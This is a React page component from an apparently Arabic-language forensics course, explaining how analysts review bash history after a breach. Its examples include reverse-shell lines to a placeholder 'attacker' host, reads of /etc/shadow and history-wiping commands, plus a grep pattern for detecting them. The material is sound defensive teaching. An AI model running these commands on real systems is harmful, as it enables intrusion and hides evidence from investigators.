import Alert from '../../components/Alert';
import CodeBlock from '../../components/CodeBlock';

const LinuxHistorySection = () => {
  return (
    <div className="space-y-8">
      <h1 className="text-3xl font-bold text-cyan-400 flex items-center gap-3">
        <span>📜</span>
        تاريخ الأوامر Bash History
      </h1>

      <div className="h-1 w-32 bg-gradient-to-l from-cyan-500 to-transparent rounded"></div>

      <Alert type="golden" title="أهمية bash history للمحلل">
        يظهر كل الأوامر التي نفذها المستخدم. من أول الأشياء التي يفحصها المحلل بعد اختراق محتمل!
      </Alert>

      {/* عرض History */}
      <section className="space-y-4">
        <h2 className="text-2xl font-bold text-white">عرض History</h2>

        <CodeBlock
          title="أوامر عرض التاريخ"
          code={`# تاريخ المستخدم الحالي
history

# أو من الملف مباشرة
cat ~/.bash_history

# تاريخ مستخدمين آخرين (يحتاج root)
cat /home/username/.bash_history
cat /root/.bash_history

# البحث في التاريخ
history | grep "wget"
history | grep "sudo"`}
        />
      </section>

      {/* ماذا تبحث عنه */}
      <section className="space-y-4 mt-12">
        <h2 className="text-2xl font-bold text-white">🔍 ماذا تبحث عنه</h2>

        <div className="grid md:grid-cols-2 gap-4">
          {/* تنزيل ملفات */}
          <div className="bg-red-900/20 rounded-xl p-6 border border-red-500/30">
            <h3 className="text-red-400 font-bold mb-4">1. أوامر تنزيل ملفات</h3>
            <CodeBlock
              code={`wget http://...
curl -O http://...
scp user@remote:/path/file .`}
            />
          </div>

          {/* تنفيذ مشبوه */}
          <div className="bg-red-900/20 rounded-xl p-6 border border-red-500/30">
            <h3 className="text-red-400 font-bold mb-4">2. تنفيذ مشبوه</h3>
            <CodeBlock
              code={`chmod +x malware
./malware
bash script.sh
python exploit.py`}
            />
          </div>

          {/* تصعيد صلاحيات */}
          <div className="bg-yellow-900/20 rounded-xl p-6 border border-yellow-500/30">
            <h3 className="text-yellow-400 font-bold mb-4">3. محاولات تصعيد صلاحيات</h3>
            <CodeBlock
              code={`sudo su
sudo -i
su -
sudo bash`}
            />
          </div>

          {/* استكشاف */}
          <div className="bg-yellow-900/20 rounded-xl p-6 border border-yellow-500/30">
            <h3 className="text-yellow-400 font-bold mb-4">4. أوامر استكشاف</h3>
            <CodeBlock
              code={`whoami
id
uname -a
cat /etc/passwd
cat /etc/shadow`}
            />
          </div>

          {/* شبكة مشبوهة */}
          <div className="bg-red-900/20 rounded-xl p-6 border border-red-500/30">
            <h3 className="text-red-400 font-bold mb-4">5. أوامر شبكة مشبوهة 🚨</h3>
            <CodeBlock
              code={`nc -lvp 4444
bash -i >& /dev/tcp/attacker/4444 0>&1
ncat -e /bin/bash attacker 4444`}
            />
          </div>

          {/* حذف آثار */}
          <div className="bg-red-900/20 rounded-xl p-6 border border-red-500/30">
            <h3 className="text-red-400 font-bold mb-4">6. أوامر حذف آثار 🚨</h3>
            <CodeBlock
              code={`history -c
rm ~/.bash_history
ln -s /dev/null ~/.bash_history
unset HISTFILE`}
            />
          </div>
        </div>
      </section>

      {/* علامات إخفاء الآثار */}
      <section className="space-y-4 mt-12">
        <h2 className="text-2xl font-bold text-white">🚨 علامات أن المهاجم حاول إخفاء آثاره</h2>

        <div className="bg-red-900/20 rounded-xl p-6 border border-red-500/30">
          <ul className="space-y-3 text-gray-300">
            <li className="flex items-center gap-2">
              <span className="text-red-400">⚠️</span>
              ملف <code className="bg-gray-700 px-2 py-1 rounded">.bash_history</code> فارغ
            </li>
            <li className="flex items-center gap-2">
              <span className="text-red-400">⚠️</span>
              ملف <code className="bg-gray-700 px-2 py-1 rounded">.bash_history</code> مرتبط بـ <code className="bg-gray-700 px-2 py-1 rounded">/dev/null</code>
            </li>
            <li className="flex items-center gap-2">
              <span className="text-red-400">⚠️</span>
              ملف <code className="bg-gray-700 px-2 py-1 rounded">.bash_history</code> مفقود
            </li>
            <li className="flex items-center gap-2">
              <span className="text-red-400">⚠️</span>
              أوامر <code className="bg-gray-700 px-2 py-1 rounded">history -c</code> في السجلات
            </li>
          </ul>
        </div>

        <CodeBlock
          title="فحص ملفات history"
          code={`# هل الملف موجود؟
ls -la ~/.bash_history

# هل هو رابط؟
file ~/.bash_history

# حجم الملف
wc -l ~/.bash_history

# آخر تعديل
stat ~/.bash_history`}
        />
      </section>

      {/* سكريبت فحص */}
      <section className="space-y-4 mt-12">
        <h2 className="text-2xl font-bold text-white">📋 سكريبت فحص history لكل المستخدمين</h2>

        <CodeBlock
          code={`#!/bin/bash
echo "=== Checking Bash History for All Users ==="

for user_home in /home/* /root; do
  if [ -d "$user_home" ]; then
    user=$(basename $user_home)
    hist_file="$user_home/.bash_history"
    
    echo ""
    echo "=== User: $user ==="
    
    if [ -f "$hist_file" ]; then
      echo "History file exists"
      echo "Lines: $(wc -l < $hist_file)"
      echo "Last modified: $(stat -c %y $hist_file 2>/dev/null)"
      
      # البحث عن أوامر مشبوهة
      echo "Suspicious commands:"
      grep -E "wget|curl|nc |ncat|/dev/tcp|chmod \\+x|history -c" $hist_file 2>/dev/null | head -10
    elif [ -L "$hist_file" ]; then
      echo "WARNING: History is a symlink to $(readlink $hist_file)"
    else
      echo "WARNING: No history file found"
    fi
  fi
done`}
        />
      </section>
    </div>
  );
};

export default LinuxHistorySection;
